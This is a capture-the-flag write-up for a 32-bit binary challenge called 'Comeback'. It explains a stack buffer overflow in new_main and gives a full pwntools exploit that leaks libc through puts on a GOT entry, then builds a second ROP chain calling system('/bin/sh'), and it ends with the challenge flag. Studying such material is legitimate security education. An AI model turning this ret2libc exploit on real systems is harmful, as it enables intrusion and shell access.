# Comeback

## Challenge

We're given a 32-bit binary with no PIE or canary.

### Checksec

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'./'
```

## Solution

The binary contains a buffer overflow vulnerability in the `new_main` function:

```c
void sym.new_main(void) {
    int32_t unaff_EBX;
    void *s;
    int32_t var_4h;
    
    sym.__x86.get_pc_thunk.bx();
    sym.imp.memset(&s, 0, 0x20);
    sym.imp.puts(unaff_EBX + 0xd53);
    sym.imp.read(0, &s, 0x200);
    sym.imp.puts(unaff_EBX + 0xd64);
    return;
}
```

The buffer `s` is 0x2c bytes large, but we are allowed to read up to 0x200 bytes into it.
With the lack of a canary or PIE, it is trivial to overwrite the return address with a rop chain.

We can use this to leak the libc address by calling `puts` on a GOT address.

Once we have the libc address, we can return back into `new_main`, where we can reuse the vulnerability to create a new rop chain.
This second rop chain will call `system("/bin/sh")` using libc functions, which will spawn a shell and allow us to read the flag.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host binary.challs.pragyanctf.tech --port 6001 vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'binary.challs.pragyanctf.tech'
port = int(args.PORT or 6001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'./'

libc = ELF('libc6_2.31-0ubuntu9.2_i386.so')

io = start()

rop = ROP(exe)
rop.call('puts', [exe.got['puts']])
rop.call('new_main')
print(rop.dump())

io.sendlineafter(b"All the Best :)\n\n", flat({0x30+4: rop.chain()}))
io.recvuntil(b"Thank you!\n")
libc.address = unpack(io.recv(4)) - libc.sym['puts']

rop = ROP(libc)
rop.call('system', [next(libc.search(b'/bin/sh'))])
print(rop.dump())

io.sendlineafter(b"All the Best :)\n\n", flat({0x30+4: rop.chain()}))
io.recvuntil(b"Thank you!\n")

io.interactive()
```

## Flag

```
p_ctf{y3s_1t_w4s_a_R0p_4gh2e7c0}
```
